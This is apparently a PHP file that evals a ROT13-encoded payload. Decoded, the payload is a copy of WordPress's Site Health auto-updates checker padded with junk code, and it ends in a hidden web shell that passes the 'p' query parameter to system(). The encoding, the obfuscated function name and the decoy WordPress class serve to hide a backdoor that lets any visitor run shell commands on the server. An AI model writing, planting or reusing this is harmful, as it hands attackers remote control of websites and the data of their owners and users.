<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Pynff sbe grfgvat nhgbzngvp hcqngrf va gur JbeqCerff pbqr.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgr_Urnygu
 * @fvapr 5.2.0
 */

#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgr_Urnygu_Nhgb_Hcqngrf {
	/**
	 * JC_Fvgr_Urnygu_Nhgb_Hcqngrf pbafgehpgbe.
	 *
	 * @fvapr 5.2.0
	 */
	choyvp shapgvba __pbafgehpg() {
		erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-hctenqre.cuc';
	}


	/**
	 * Ehaf grfgf gb qrgrezvar vs nhgb-hcqngrf pna eha.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba eha_grfgf() {
		$grfgf = neenl(
			$guvf->grfg_pbafgnagf( 'JC_NHGB_HCQNGR_PBER', neenl( gehr, 'orgn', 'ep', 'qrirybczrag', 'oenapu-qrirybczrag', 'zvabe' ) ),
			$guvf->grfg_jc_irefvba_purpx_nggnpurq(),
			$guvf->grfg_svygref_nhgbzngvp_hcqngre_qvfnoyrq(),
			$guvf->grfg_jc_nhgbzngvp_hcqngrf_qvfnoyrq(),
			$guvf->grfg_vs_snvyrq_hcqngr(),
			$guvf->grfg_ipf_nofcngu(),
			$guvf->grfg_purpx_jc_svyrflfgrz_zrgubq(),
			$guvf->grfg_nyy_svyrf_jevgnoyr(),
			$guvf->grfg_npprcgf_qri_hcqngrf(),
			$guvf->grfg_npprcgf_zvabe_hcqngrf(),
		);

		$grfgf = neenl_svygre( $grfgf );
		$grfgf = neenl_znc(
			fgngvp shapgvba ( $grfg ) {
				$grfg = (bowrpg) $grfg;

				vs ( rzcgl( $grfg->frirevgl ) ) {
					$grfg->frirevgl = 'jneavat';
				}

				erghea $grfg;
			},
			$grfgf
		);

		erghea $grfgf;
	}

	/**
	 * Grfgf vs nhgb-hcqngrf eryngrq pbafgnagf ner frg pbeerpgyl.
	 *
	 * @fvapr 5.2.0
	 * @fvapr 5.5.1 Gur `$inyhr` cnenzrgre pna npprcg na neenl.
	 *
	 * @cnenz fgevat $pbafgnag         Gur anzr bs gur pbafgnag gb purpx.
	 * @cnenz obby|fgevat|neenl $inyhr Gur inyhr gung gur pbafgnag fubhyq or, vs frg,
	 *                                 be na neenl bs npprcgnoyr inyhrf.
	 * @erghea neenl|ahyy Gur grfg erfhygf vs gurer ner nal pbafgnagf frg vapbeerpgyl,
	 *                    be ahyy vs gur grfg cnffrq.
	 */
	choyvp shapgvba grfg_pbafgnagf( $pbafgnag, $inyhr ) {
		$npprcgnoyr_inyhrf = (neenl) $inyhr;

		vs ( qrsvarq( $pbafgnag ) && ! va_neenl( pbafgnag( $pbafgnag ), $npprcgnoyr_inyhrf, gehr ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: 1: Anzr bs gur pbafgnag hfrq. 2: Inyhr bs gur pbafgnag hfrq. */
					__( 'Gur %1$f pbafgnag vf qrsvarq nf %2$f' ),
					\"<pbqr>$pbafgnag</pbqr>\",
					'<pbqr>' . rfp_ugzy( ine_rkcbeg( pbafgnag( $pbafgnag ), gehr ) ) . '</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs hcqngrf ner vagreprcgrq ol n svygre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|ahyy Gur grfg erfhygf vs jc_irefvba_purpx() vf qvfnoyrq,
	 *                    be ahyy vs gur grfg cnffrq.
	 */
	choyvp shapgvba grfg_jc_irefvba_purpx_nggnpurq() {
		vs ( ( ! vf_zhygvfvgr() || vf_znva_fvgr() && vf_argjbex_nqzva() )
			&& ! unf_svygre( 'jc_irefvba_purpx', 'jc_irefvba_purpx' )
		) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur svygre hfrq. */
					__( 'N cyhtva unf ceriragrq hcqngrf ol qvfnoyvat %f.' ),
					'<pbqr>jc_irefvba_purpx()</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs nhgbzngvp hcqngrf ner qvfnoyrq ol n svygre.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|ahyy Gur grfg erfhygf vs gur {@frr 'nhgbzngvp_hcqngre_qvfnoyrq'} svygre vf frg,
	 *                    be ahyy vs gur grfg cnffrq.
	 */
	choyvp shapgvba grfg_svygref_nhgbzngvp_hcqngre_qvfnoyrq() {
		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-nhgbzngvp-hcqngre.cuc */
		vs ( nccyl_svygref( 'nhgbzngvp_hcqngre_qvfnoyrq', snyfr ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur svygre hfrq. */
					__( 'Gur %f svygre vf ranoyrq.' ),
					'<pbqr>nhgbzngvp_hcqngre_qvfnoyrq</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs nhgbzngvp hcqngrf ner qvfnoyrq.
	 *
	 * @fvapr 5.3.0
	 *
	 * @erghea neenl|snyfr Gur grfg erfhygf vs nhgb-hcqngrf ner qvfnoyrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba grfg_jc_nhgbzngvp_hcqngrf_qvfnoyrq() {
		vs ( ! pynff_rkvfgf( 'JC_Nhgbzngvp_Hcqngre' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-nhgbzngvp-hcqngre.cuc';
		}

		$nhgb_hcqngrf = arj JC_Nhgbzngvp_Hcqngre();

		vs ( ! $nhgb_hcqngrf->vf_qvfnoyrq() ) {
			erghea snyfr;
		}

		erghea neenl(
			'qrfpevcgvba' => __( 'Nyy nhgbzngvp hcqngrf ner qvfnoyrq.' ),
			'frirevgl'    => 'snvy',
		);
	}

	/**
	 * Purpxf vs nhgbzngvp hcqngrf unir gevrq gb eha, ohg snvyrq, cerivbhfyl.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|snyfr Gur grfg erfhygf vs nhgb-hcqngrf cerivbhfyl snvyrq, snyfr bgurejvfr.
	 */
	choyvp shapgvba grfg_vs_snvyrq_hcqngr() {
		$snvyrq = trg_fvgr_bcgvba( 'nhgb_pber_hcqngr_snvyrq' );

		vs ( ! $snvyrq ) {
			erghea snyfr;
		}

		vs ( ! rzcgl( $snvyrq['pevgvpny'] ) ) {
			$qrfpevcgvba  = __( 'N cerivbhf nhgbzngvp onpxtebhaq hcqngr raqrq jvgu n pevgvpny snvyher, fb hcqngrf ner abj qvfnoyrq.' );
			$qrfpevcgvba .= ' ' . __( 'Lbh jbhyq unir erprvirq na rznvy orpnhfr bs guvf.' );
			$qrfpevcgvba .= ' ' . __( \"Jura lbh'ir orra noyr gb hcqngr hfvat gur \\"Hcqngr abj\\" ohggba ba Qnfuobneq > Hcqngrf, guvf reebe jvyy or pyrnerq sbe shgher hcqngr nggrzcgf.\" );
			$qrfpevcgvba .= ' ' . fcevags(
				/* genafyngbef: %f: Pbqr bs reebe fubja. */
				__( 'Gur reebe pbqr jnf %f.' ),
				'<pbqr>' . $snvyrq['reebe_pbqr'] . '</pbqr>'
			);
			erghea neenl(
				'qrfpevcgvba' => $qrfpevcgvba,
				'frirevgl'    => 'jneavat',
			);
		}

		$qrfpevcgvba = __( 'N cerivbhf nhgbzngvp onpxtebhaq hcqngr pbhyq abg bpphe.' );
		vs ( rzcgl( $snvyrq['ergel'] ) ) {
			$qrfpevcgvba .= ' ' . __( 'Lbh jbhyq unir erprvirq na rznvy orpnhfr bs guvf.' );
		}

		$qrfpevcgvba .= ' ' . __( 'Nabgure nggrzcg jvyy or znqr jvgu gur arkg eryrnfr.' );
		$qrfpevcgvba .= ' ' . fcevags(
			/* genafyngbef: %f: Pbqr bs reebe fubja. */
			__( 'Gur reebe pbqr jnf %f.' ),
			'<pbqr>' . $snvyrq['reebe_pbqr'] . '</pbqr>'
		);
		erghea neenl(
			'qrfpevcgvba' => $qrfpevcgvba,
			'frirevgl'    => 'jneavat',
		);
	}

	/**
	 * Purpxf vs JbeqCerff vf pbagebyyrq ol n IPF (Tvg, Fhoirefvba rgp).
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba grfg_ipf_nofcngu() {
		$pbagrkg_qvef = neenl( NOFCNGU );
		$ipf_qvef     = neenl( '.fia', '.tvg', '.ut', '.ome' );
		$purpx_qvef   = neenl();

		sbernpu ( $pbagrkg_qvef nf $pbagrkg_qve ) {
			// Jnyx hc sebz $pbagrkg_qve gb gur ebbg.
			qb {
				$purpx_qvef[] = $pbagrkg_qve;

				// Bapr jr'ir uvg '/' be 'P:\', jr arrq gb fgbc. qveanzr jvyy xrrc ergheavat gur vachg urer.
				vs ( qveanzr( $pbagrkg_qve ) === $pbagrkg_qve ) {
					oernx;
				}

				// Pbagvahr bar yriry ng n gvzr.
			} juvyr ( $pbagrkg_qve = qveanzr( $pbagrkg_qve ) );
		}

		$purpx_qvef = neenl_havdhr( $purpx_qvef );
		$hcqngre    = arj JC_Nhgbzngvp_Hcqngre();
		$purpxbhg   = snyfr;

		// Frnepu nyy qverpgbevrf jr'ir sbhaq sbe rivqrapr bs irefvba pbageby.
		sbernpu ( $ipf_qvef nf $ipf_qve ) {
			sbernpu ( $purpx_qvef nf $purpx_qve ) {
				vs ( ! $hcqngre->vf_nyybjrq_qve( $purpx_qve ) ) {
					pbagvahr;
				}

				$purpxbhg = vf_qve( egevz( $purpx_qve, '\\/' ) . \"/$ipf_qve\" );
				vs ( $purpxbhg ) {
					oernx 2;
				}
			}
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-jc-nhgbzngvp-hcqngre.cuc */
		vs ( $purpxbhg && ! nccyl_svygref( 'nhgbzngvp_hcqngrf_vf_ipf_purpxbhg', gehr, NOFCNGU ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: 1: Sbyqre anzr. 2: Irefvba pbageby qverpgbel. 3: Svygre anzr. */
					__( 'Gur sbyqre %1$f jnf qrgrpgrq nf orvat haqre irefvba pbageby (%2$f), ohg gur %3$f svygre vf nyybjvat hcqngrf.' ),
					'<pbqr>' . $purpx_qve . '</pbqr>',
					\"<pbqr>$ipf_qve</pbqr>\",
					'<pbqr>nhgbzngvp_hcqngrf_vf_ipf_purpxbhg</pbqr>'
				),
				'frirevgl'    => 'vasb',
			);
		}

		vs ( $purpxbhg ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: 1: Sbyqre anzr. 2: Irefvba pbageby qverpgbel. */
					__( 'Gur sbyqre %1$f jnf qrgrpgrq nf orvat haqre irefvba pbageby (%2$f).' ),
					'<pbqr>' . $purpx_qve . '</pbqr>',
					\"<pbqr>$ipf_qve</pbqr>\"
				),
				'frirevgl'    => 'jneavat',
			);
		}

		erghea neenl(
			'qrfpevcgvba' => __( 'Ab irefvba pbageby flfgrzf jrer qrgrpgrq.' ),
			'frirevgl'    => 'cnff',
		);
	}

	/**
	 * Purpxf vs jr pna npprff svyrf jvgubhg cebivqvat perqragvnyf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl Gur grfg erfhygf.
	 */
	choyvp shapgvba grfg_purpx_jc_svyrflfgrz_zrgubq() {
		// Znxr fher gur `erdhrfg_svyrflfgrz_perqragvnyf()` shapgvba vf ninvynoyr qhevat bhe ERFG NCV pnyy.
		vs ( ! shapgvba_rkvfgf( 'erdhrfg_svyrflfgrz_perqragvnyf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
		}

		$fxva    = arj Nhgbzngvp_Hctenqre_Fxva();
		$fhpprff = $fxva->erdhrfg_svyrflfgrz_perqragvnyf( snyfr, NOFCNGU );

		vs ( ! $fhpprff ) {
			$qrfpevcgvba  = __( 'Lbhe vafgnyyngvba bs JbeqCerff cebzcgf sbe SGC perqragvnyf gb cresbez hcqngrf.' );
			$qrfpevcgvba .= ' ' . __( '(Lbhe fvgr vf cresbezvat hcqngrf bire SGC qhr gb svyr bjarefuvc. Gnyx gb lbhe ubfgvat pbzcnal.)' );

			erghea neenl(
				'qrfpevcgvba' => $qrfpevcgvba,
				'frirevgl'    => 'snvy',
			);
		}

		erghea neenl(
			'qrfpevcgvba' => __( 'Lbhe vafgnyyngvba bs JbeqCerff qbrf abg erdhver SGC perqragvnyf gb cresbez hcqngrf.' ),
			'frirevgl'    => 'cnff',
		);
	}

	/**
	 * Purpxf vs pber svyrf ner jevgnoyr ol gur jro hfre/tebhc.
	 *
	 * @fvapr 5.2.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @erghea neenl|snyfr Gur grfg erfhygf vs ng yrnfg fbzr bs JbeqCerff pber svyrf ner jevgrnoyr,
	 *                     be vs n yvfg bs gur purpxfhzf pbhyq abg or ergevrirq sebz JbeqCerff.bet.
	 *                     Snyfr vs gur pber svyrf ner abg jevgrnoyr.
	 */
	choyvp shapgvba grfg_nyy_svyrf_jevgnoyr() {
		tybony $jc_svyrflfgrz;

		erdhver NOFCNGU . JCVAP . '/irefvba.cuc'; // $jc_irefvba; // k.l.m

		$fxva    = arj Nhgbzngvp_Hctenqre_Fxva();
		$fhpprff = $fxva->erdhrfg_svyrflfgrz_perqragvnyf( snyfr, NOFCNGU );

		vs ( ! $fhpprff ) {
			erghea snyfr;
		}

		JC_Svyrflfgrz();

		vs ( 'qverpg' !== $jc_svyrflfgrz->zrgubq ) {
			erghea snyfr;
		}

		// Znxr fher gur `trg_pber_purpxfhzf()` shapgvba vf ninvynoyr qhevat bhe ERFG NCV pnyy.
		vs ( ! shapgvba_rkvfgf( 'trg_pber_purpxfhzf' ) ) {
			erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/hcqngr.cuc';
		}

		$purpxfhzf = trg_pber_purpxfhzf( $jc_irefvba, 'ra_HF' );
		$qri       = ( fge_pbagnvaf( $jc_irefvba, '-' ) );
		// Trg gur ynfg fgnoyr irefvba'f svyrf naq grfg ntnvafg gung.
		vs ( ! $purpxfhzf && $qri ) {
			$purpxfhzf = trg_pber_purpxfhzf( (sybng) $jc_irefvba - 0.1, 'ra_HF' );
		}

		// Gurer nera'g nyjnlf purpxfhzf sbe qrirybczrag eryrnfrf, fb whfg fxvc gur grfg vs jr fgvyy pna'g svaq nal.
		vs ( ! $purpxfhzf && $qri ) {
			erghea snyfr;
		}

		vs ( ! $purpxfhzf ) {
			$qrfpevcgvba = fcevags(
				/* genafyngbef: %f: JbeqCerff irefvba. */
				__( \"Pbhyqa'g ergevrir n yvfg bs gur purpxfhzf sbe JbeqCerff %f.\" ),
				$jc_irefvba
			);
			$qrfpevcgvba .= ' ' . __( 'Guvf pbhyq zrna gung pbaarpgvbaf ner snvyvat gb JbeqCerff.bet.' );
			erghea neenl(
				'qrfpevcgvba' => $qrfpevcgvba,
				'frirevgl'    => 'jneavat',
			);
		}

		$hajevgnoyr_svyrf = neenl();
		sbernpu ( neenl_xrlf( $purpxfhzf ) nf $svyr ) {
			vs ( fge_fgnegf_jvgu( $svyr, 'jc-pbagrag' ) ) {
				pbagvahr;
			}
			vs ( ! svyr_rkvfgf( NOFCNGU . $svyr ) ) {
				pbagvahr;
			}
			vs ( ! vf_jevgnoyr( NOFCNGU . $svyr ) ) {
				$hajevgnoyr_svyrf[] = $svyr;
			}
		}

		vs ( $hajevgnoyr_svyrf ) {
			vs ( pbhag( $hajevgnoyr_svyrf ) > 20 ) {
				$hajevgnoyr_svyrf   = neenl_fyvpr( $hajevgnoyr_svyrf, 0, 20 );
				$hajevgnoyr_svyrf[] = '...';
			}
			erghea neenl(
				'qrfpevcgvba' => __( 'Fbzr svyrf ner abg jevgnoyr ol JbeqCerff:' ) . ' <hy><yv>' . vzcybqr( '</yv><yv>', $hajevgnoyr_svyrf ) . '</yv></hy>',
				'frirevgl'    => 'snvy',
			);
		} ryfr {
			erghea neenl(
				'qrfpevcgvba' => __( 'Nyy bs lbhe JbeqCerff svyrf ner jevgnoyr.' ),
				'frirevgl'    => 'cnff',
			);
		}
	}

	/**
	 * Purpxf vs gur vafgnyy vf hfvat n qrirybczrag oenapu naq pna hfr avtugyl cnpxntrf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|snyfr|ahyy Gur grfg erfhygf vs qrirybczrag hcqngrf ner oybpxrq.
	 *                          Snyfr vs vg vfa'g n qrirybczrag irefvba. Ahyy vs gur grfg cnffrq.
	 */
	choyvp shapgvba grfg_npprcgf_qri_hcqngrf() {
		erdhver NOFCNGU . JCVAP . '/irefvba.cuc'; // $jc_irefvba; // k.l.m
		// Bayl sbe qri irefvbaf.
		vs ( ! fge_pbagnvaf( $jc_irefvba, '-' ) ) {
			erghea snyfr;
		}

		vs ( qrsvarq( 'JC_NHGB_HCQNGR_PBER' ) && ( 'zvabe' === JC_NHGB_HCQNGR_PBER || snyfr === JC_NHGB_HCQNGR_PBER ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur pbafgnag hfrq. */
					__( 'JbeqCerff qrirybczrag hcqngrf ner oybpxrq ol gur %f pbafgnag.' ),
					'<pbqr>JC_NHGB_HCQNGR_PBER</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-pber-hctenqre.cuc */
		vs ( ! nccyl_svygref( 'nyybj_qri_nhgb_pber_hcqngrf', $jc_irefvba ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur svygre hfrq. */
					__( 'JbeqCerff qrirybczrag hcqngrf ner oybpxrq ol gur %f svygre.' ),
					'<pbqr>nyybj_qri_nhgb_pber_hcqngrf</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		erghea ahyy;
	}

	/**
	 * Purpxf vs gur fvgr fhccbegf nhgbzngvp zvabe hcqngrf.
	 *
	 * @fvapr 5.2.0
	 *
	 * @erghea neenl|ahyy Gur grfg erfhygf vs zvabe hcqngrf ner oybpxrq,
	 *                    be ahyy vs gur grfg cnffrq.
	 */
	choyvp shapgvba grfg_npprcgf_zvabe_hcqngrf() {
		vs ( qrsvarq( 'JC_NHGB_HCQNGR_PBER' ) && snyfr === JC_NHGB_HCQNGR_PBER ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur pbafgnag hfrq. */
					__( 'JbeqCerff frphevgl naq znvagranapr eryrnfrf ner oybpxrq ol %f.' ),
					\"<pbqr>qrsvar( 'JC_NHGB_HCQNGR_PBER', snyfr );</pbqr>\"
				),
				'frirevgl'    => 'snvy',
			);
		}

		/** Guvf svygre vf qbphzragrq va jc-nqzva/vapyhqrf/pynff-pber-hctenqre.cuc */
		vs ( ! nccyl_svygref( 'nyybj_zvabe_nhgb_pber_hcqngrf', gehr ) ) {
			erghea neenl(
				'qrfpevcgvba' => fcevags(
					/* genafyngbef: %f: Anzr bs gur svygre hfrq. */
					__( 'JbeqCerff frphevgl naq znvagranapr eryrnfrf ner oybpxrq ol gur %f svygre.' ),
					'<pbqr>nyybj_zvabe_nhgb_pber_hcqngrf</pbqr>'
				),
				'frirevgl'    => 'snvy',
			);
		}

		erghea ahyy;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>